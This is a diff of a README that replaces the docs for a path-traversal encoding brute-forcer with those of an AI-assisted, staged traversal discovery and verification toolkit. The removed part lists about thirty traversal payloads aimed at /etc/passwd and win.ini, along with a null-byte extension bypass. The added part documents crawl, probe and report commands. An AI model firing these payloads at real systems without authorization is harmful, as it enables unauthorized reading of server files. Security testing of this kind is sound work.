@@ -1,171 +1,175 @@
-# path-traversal 🔍
+# exploit-path-traversal
 
-Automated path traversal testing tool that tests **30+ encoding variations** of directory traversal payloads against a target URL. Identifies potentially vulnerable file read endpoints by testing how the server responds to different encoding obfuscations of `../`.
+AI-assisted, staged path-traversal discovery and verification toolkit.
 
-## Features
+Use it only against systems you are **authorized** to test.
 
-- **30+ encoding techniques** — raw, single/double/triple percent-encode, Unicode overlong UTF-8, fullwidth, null-byte, backslash, triple-dot, quad-dot, semicolon, Apache mod_alias style, `/proc/self` symlink, and more
-- **Live streaming logs** — each request prints the moment it completes, with the full URL
-- **Parallel mode** — fire requests concurrently with `-t N`
-- **Cross-platform** — Unix (`/etc/passwd`) and Windows (`win.ini`) targets
-- **Zero dependencies** — pure Python 3, no pip installs needed
-- **Colored output** — green for hits, gray for 404s, red for errors
+> Successor to the old `path-traversal` encoding brute-forcer. That single-file
+> tool has been removed; its encoding taxonomy lives on in git history
+> (`encoding-techniques.md`) and will be folded into Stage 2.
 
-## Installation
+## What it is
 
-### Quick install (one-liner)
+Path traversal detection is a blackbox behavioral test — there is no "100%".
+The tool is built to **maximize true-positive rate across
+encoding/normalization variants while keeping false positives near zero**, in
+four stages:
 
-```bash
-git clone https://github.com/Deadmafiya/path-traversal.git
-cd path-traversal
-chmod +x install.sh && ./install.sh
-```
+| Stage | Name | Status |
+|------:|------|--------|
+| 1 | Input-vector enumeration | **available** (`stage1`) |
+| 2 | Baseline-first differential probing | **available** (`stage2`) |
+| 3 | Verification / evidence | folded into Stage 2 (reproduce + round-trip; real OOB still planned) |
+| 4 | Markdown report | **available** (`report`) |
 
-### From the repo
+See [DESIGN.md](DESIGN.md) for architecture and roadmap.
 
-```bash
-cd path-traversal/
-./install.sh                    # installs to ~/.local/bin
-./install.sh --prefix ~/.bin    # custom directory
-./install.sh --no-verify        # skip post-install smoke test
-```
-
-### Manual symlink
+## Install
 
 ```bash
-ln -s "$PWD/path-traversal.py" ~/.local/bin/path-traversal
+git clone <this repo> && cd path-traversal
+./install.sh
 ```
 
-## Usage
+`install.sh` uses `pipx` if present, otherwise builds a project virtualenv and
+symlinks `exploit-path-traversal` into `~/.local/bin`.
+
+Requires Python 3.9+. Runtime dep: `httpx`. `PyYAML` is optional (only for YAML
+OpenAPI specs — JSON specs need nothing).
+
+## AI agent config
+
+The agent talks to any OpenAI-compatible `/chat/completions` API. Copy
+`.env.example` to `.env` in your working directory, or export:
 
 ```bash
-path-traversal -u "http://example.com/file?file="
+export EPT_AI_BASE_URL=https://api.openai.com/v1
+export EPT_AI_MODEL=gpt-4o-mini
+export EPT_AI_API_KEY=sk-...
 ```
 
-This appends each encoding variant of `../../../etc/passwd` to the end of the URL and tests them all.
+Without these, Stage 1 still runs with deterministic scoring only and tells you
+the AI pass was skipped. Use `--no-ai` to force that.
 
-### With a base path
+## Stage 1 — input-vector enumeration
+
+Builds a source-to-sink dataflow inventory: every attacker-influenced value
+that could reach, select, construct, modify, resolve, or indirectly determine a
+filesystem path — not just params named `file`/`path`. Each vector is scored for
+traversal-relevance (rule-based, then refined by the agent) and tagged with a
+coverage dimension (A–L).
+
+### Usage
 
 ```bash
-path-traversal -u "http://example.com/file?file=var/www/"
+# crawl a site
+exploit-path-traversal stage1 -u https://target.example.com
+
+# crawl + import an API spec and a proxy capture
+exploit-path-traversal stage1 -u https://target.example.com \
+    --openapi ./openapi.yaml --har ./session.har
+
+# spec only, no crawl, no AI
+exploit-path-traversal stage1 --openapi ./swagger.json --no-ai
+
+# authed crawl, tighter scope, slower
+exploit-path-traversal stage1 -u https://app.example.com \
+    --scope app.example.com,api.example.com \
+    -H 'Authorization: Bearer eyJ...' -b 'session=abc123' \
+    --depth 3 --rate 2
 ```
 
-Appends the traversal after `var/www/`: `var/www/../../../etc/passwd`.
+### Key options
 
-### Windows target
+| Flag | Meaning |
+|------|---------|
+| `-u, --url` | base URL to crawl |
+| `--seed URL` | extra seed URL (repeatable) |
+| `--openapi / --har / --postman FILE` | import a spec/capture (repeatable) |
+| `--scope hosts` | comma-separated host allowlist (default: seed's registrable domain) |
+| `--depth / --max-pages` | crawl bounds (default 2 / 200) |
+| `--rate / --timeout` | requests/sec and per-request timeout (default 5 / 15) |
+| `--no-js` | skip JavaScript endpoint extraction |
+| `-H 'K: V'` / `-b 'k=v'` | extra header / cookie (repeatable) |
+| `--insecure` | skip TLS verification |
+| `--no-ai` | deterministic scoring only |
+| `--app-hint` | one line about the app, passed to the agent |
+| `-o, --out DIR` | output directory (default `./ept-out`) |
+| `--json-only` | write JSON, skip the terminal summary |
+
+### Output
+
+- terminal: header, crawl/import stats, top vectors by relevance, the A–L
+  coverage matrix with gap notes
+- `<out>/stage1-vectors.json`: the full inventory — the input to Stage 2
+
+Output style is deliberately plain: bold/dim only, honours `NO_COLOR` and
+non-TTY, no decorative symbols.
+
+## Stage 2 — baseline-first differential probing
+
+For each selected vector: establish a **known-good baseline** fingerprint and a
+**negative control** (well-formed missing resource), then send traversal
+payloads and classify each response by *how it differs from normal behavior* —
+never on status code alone. Verdicts: `confirmed` (canary file content in the
+body), `likely` (unlike baseline and control, shaped like a file read; or a
+reflected escaped upload path), `inconclusive`, `not-vulnerable`. Confirmed /
+likely findings are re-sent to check they reproduce.
+
+### Usage
 
 ```bash
-path-traversal -u "http://example.com/download?file=" -p windows
+# run stage 1 then probe, in one go
+exploit-path-traversal stage2 -u https://target.example.com
+
+# probe an existing stage 1 artifact
+exploit-path-traversal stage2 --in ./ept-out/stage1-vectors.json
+
+# from an API spec, Windows canary, only JSON-body vectors, force a baseline
+exploit-path-traversal stage2 --openapi ./api.json --canary windows \
+    --location json-body --baseline 'report=q3-report.txt'
 ```
 
-Tests `..\..\..\windows\win.ini`, backslash encodings, drive-relative paths, and device names.
+### Key options
 
-### Null-byte truncation (bypass extension checks)
+| Flag | Meaning |
+|------|---------|
+| `--in FILE` | `stage1-vectors.json` to probe (else give `-u`/`--openapi`/… to run stage 1 first) |
+| `--min-relevance` | only probe vectors at/above this score (default 0.4) |
+| `--location` | comma-separated locations to probe (`query,json-body,…`) |
+| `--only ID` | probe just one vector id (repeatable) |
+| `--baseline 'name=value'` | force a known-good value for a field (repeatable) |
+| `--canary` | `unix` (default, `/etc/passwd`), `windows`, or `both` |
+| `--depth-max` | max `../` depth (default 6) |
+| `--max-payloads` | payload cap per vector (default 60) |
+| `--thorough` | more canary targets + payloads |
+| `--no-ai` | skip AI adjudication of likely/inconclusive findings |
+| `--rate` / `--timeout` / `--insecure` / `-H` / `-b` | HTTP controls (as in stage 1) |
+
+### Output
+
+- terminal: verdict counts, then each non-clean finding with its winning
+  payload, signals, AI note (if any), and a `curl --path-as-is` repro line
+- `<out>/stage2-findings.json`: every finding with baseline + control
+  fingerprints and the full probe list
+
+### Limitations
+
+- upload/write-side traversal is `confirmed` only if the escaped file is
+  reachable via a guessed URL; otherwise it caps at `likely` (no OOB channel yet)
+- suffix-constrained sinks (app appends `.txt`) may read `inconclusive` /
+  `not-vulnerable` for the `/etc/passwd` canary even though traversal-shaped
+  (null-byte variants are tried but modern runtimes reject them)
+- raw `../` in a URL path isn't sent (httpx normalizes it) — only encoded
+  separators for path-segment vectors
+
+## Stage 4 — Markdown report
 
 ```bash
-path-traversal -u "http://example.com/upload?file=" -n .jpg
+exploit-path-traversal report --in ./ept-out/stage2-findings.json
 ```
 
-Appends `%00.jpg` to every payload so the server validates the `.jpg` extension but truncates at the null byte and reads the underlying file (classic PHP < 5.3.4 behavior). Accepts `.jpg`, `jpg`, or `%00.jpg`.
-
-### Options
-
-| Flag | Description | Default |
-|------|-------------|---------|
-| `-u, --url` | Target URL (required) | — |
-| `-p, --platform` | `unix` or `windows` | `unix` |
-| `-d, --depth` | Number of `../` directories | `10` |
-| `-t, --threads` | Concurrent requests | `1` |
-| `-n, --nullbyte` | Append null-byte suffix (e.g. `-n .jpg` → `%00.jpg`) | off |
-| `--timeout` | Request timeout in seconds | `10` |
-| `-o, --only-interesting` | Show only non-404 responses | off |
-| `--no-live` | Wait, then print table (no streaming) | off |
-| `--no-color` | Disable colored output | off |
-
-## Encoding Techniques Tested
-
-The tool tests **30+ encoding variations** organized by category:
-
-### Percent-encoding
-| # | Technique | Payload |
-|---|-----------|---------|
-| 1 | Raw | `../../../etc/passwd` |
-| 2 | Single percent-encode | `%2e%2e%2f%2e%2e%2f../etc/passwd` |
-| 3 | Double percent-encode | `%252e%252e%252f%252e%252e%252f../etc/passwd` |
-| 4 | Triple percent-encode | `%25252e%25252e%25252f...` |
-| 5 | Slash-only encode | `..%2f..%2f..%2fetc/passwd` |
-| 6 | Dot-only encode | `%2e%2e/%2e%2e/%2e%2e/etc/passwd` |
-| 7 | Mixed case hex | `%2E%2e%2F%2e%2E%2f...` |
-| 8 | Upper hex | `..%2F..%2F..%2Fetc/passwd` |
-
-### Unicode & Charset
-| # | Technique | Payload |
-|---|-----------|---------|
-| 9 | Overlong UTF-8 (IIS) | `%c0%ae%c0%ae%c0%af...etc%c0%afpasswd` |
-| 10 | Fullwidth Unicode | `．．／．．／．．／etc／passwd` |
-
-### Path obfuscation
-| # | Technique | Payload |
-|---|-----------|---------|
-| 11 | Null byte | `../../../etc/passwd%00` |
-| 12 | Trailing space | `../../../etc/passwd%20` |
-| 13 | Triple dot | `.../.../.../etc/passwd` |
-| 14 | Quad-dot double-slash | `....//....//....//etc/passwd` |
-| 15 | Semicolon path param | `..;/..;/..;/etc/passwd` |
-| 16 | Tab separator | `..%09..%09..%09etc/passwd` |
-| 17 | Plus sign | `..+/..+/..+/etc/passwd` |
-| 18 | Space/plus mismatch | `..+/..+/..+/etc/passwd` |
-| 19 | Alternating | `..%2f../..%2f../etc/passwd` |
-| 20 | Mixed encoding | `%2e%2e%2f..%2f%2e%2e/../etc/passwd` |
-| 21 | Split encode | `../../..%2f..%2fetc/passwd` |
-| 22 | RFC 5987 filename* | `UTF-8''../../../etc/passwd` |
-
-### Platform-specific
-| # | Technique | Payload |
-|---|-----------|---------|
-| 23 | Backslash (Windows) | `..\..\..\windows\win.ini` |
-| 24 | Encoded backslash | `%2e%2e%5c%2e%2e%5c...windows%5cwin.ini` |
-| 25 | Drive-relative (Windows) | `C:..\..\..\windows\win.ini` |
-| 26 | `/proc/self` symlink (Linux) | `/proc/self/root/../../../etc/passwd` |
-
-### Server-specific
-| # | Technique | Payload |
-|---|-----------|---------|
-| 27 | Apache mod_alias (CVE-2021-41773) | `.{%2e}/.{%2e}/.{%2e}/etc/passwd` |
-| 28 | Nginx alias | `..%2f..%2f..%2fetc/passwd` |
-| 29 | .NET-style | `..%2f..%2f..%2fetc/passwd` |
-| 30 | Double-encode uppercase | `%252E%252E%252F../../../etc/passwd` |
-
-## Example Output
-
-```
-  path-traversal v1.4.0
-  ────────────────────────────────────────────────
-  Target:   https://httpbin.org/get?file=<payload>
-  File:    /etc/passwd (unix)
-  Depth:   10 directories
-  Tests:   30 encoding variations
-  ────────────────────────────────────────────────
-
-  [  1/30] raw                       200     404  Raw ../ traversal, no obfuscation ← hit
-          https://httpbin.org/get?file=../../../../../../../../../../etc/passwd
-  [  2/30] percent-full              200     404  Every char percent-encoded (%2e%2e%2f...) ← hit
-          https://httpbin.org/get?file=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f...
-  [  3/30] unicode-overlong          200     616  Overlong UTF-8 (IIS, %c0%ae%c0%ae%c0%af) ← hit
-          https://httpbin.org/get?file=%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af...
-  ...
-
-  ────────────────────────────────────────────────
-  Summary:  30 tests, 30 interesting, 40.2s
-  ▶ #1 [raw] → 200 (404B)
-      https://httpbin.org/get?file=../../../../../../../../../../etc/passwd
-  ▶ #3 [unicode-overlong] → 200 (616B)
-      https://httpbin.org/get?file=%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af...
-  ✓ 30 interesting response(s) found — review manually.
-```
-
-## Reference
-
-For a deep dive into each encoding technique, see the companion file:
-
-- [encoding-techniques.md](encoding-techniques.md) — comprehensive taxonomy with CVE reference table, mitigation guidance, and per-technique caveats.
+Writes `report.md`: summary counts, an actionable-findings table, per-finding
+detail (winning payload, similarity, signals, baseline + control fingerprints,
+AI note, `curl --path-as-is` repro), a not-vulnerable appendix, and the Stage 1
+A–L coverage matrix (auto-loaded from the sibling `stage1-vectors.json`).
